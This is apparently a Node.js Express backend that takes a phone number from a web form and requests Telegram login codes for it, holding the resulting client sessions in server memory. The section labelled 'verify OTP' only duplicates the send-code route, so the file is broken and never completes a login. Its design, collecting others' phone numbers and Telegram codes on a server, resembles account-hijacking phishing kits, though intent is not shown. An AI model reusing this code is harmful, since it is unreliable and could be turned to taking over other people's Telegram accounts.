require('dotenv').config();
const express = require('express');
const path = require('path');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// Telegram config
const apiId = parseInt(process.env.API_ID);
const apiHash = process.env.API_HASH;

// temp store (in-memory)
const tempSessions = {};

// ================= ROUTES =================

// serve UI
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// favicon fix (avoid 404)
app.get('/favicon.ico', (req, res) => res.status(204));


// 🔹 STEP 1: send OTP
app.post('/send-otp', async (req, res) => {
  let { phone } = req.body;

  if (!phone) {
    return res.json({ success: false, error: 'Phone required' });
  }

  try {
    // normalize phone
    phone = String(phone).trim();
    if (!phone.startsWith('+')) {
      phone = '+855' + phone;
    }

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 5,
    });

    await client.connect();

    // ✅ correct method (fix error)
    const result = await client.sendCodeRequest(phone);

    // save temp session
    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash,
    };

    console.log("OTP sent:", phone);

    res.json({ success: true });

  } catch (err) {
    console.error("SEND OTP ERROR:", err.message);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});


// 🔹 STEP 2: verify OTP
const { Api } = require('telegram');

app.post('/send-otp', async (req, res) => {
  let { phone } = req.body;

  try {
    phone = String(phone).trim();
    if (!phone.startsWith('+')) {
      phone = '+855' + phone;
    }

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, {
      connectionRetries: 5,
    });

    await client.connect();

    // ✅ CORRECT METHOD (all versions)
    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId: apiId,
        apiHash: apiHash,
        settings: new Api.CodeSettings({})
      })
    );

    // save temp
    tempSessions[phone] = {
      client,
      phoneCodeHash: result.phoneCodeHash,
    };

    console.log("OTP sent:", phone);

    res.json({ success: true });

  } catch (err) {
    console.error("SEND OTP ERROR:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});


// ================= START =================
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
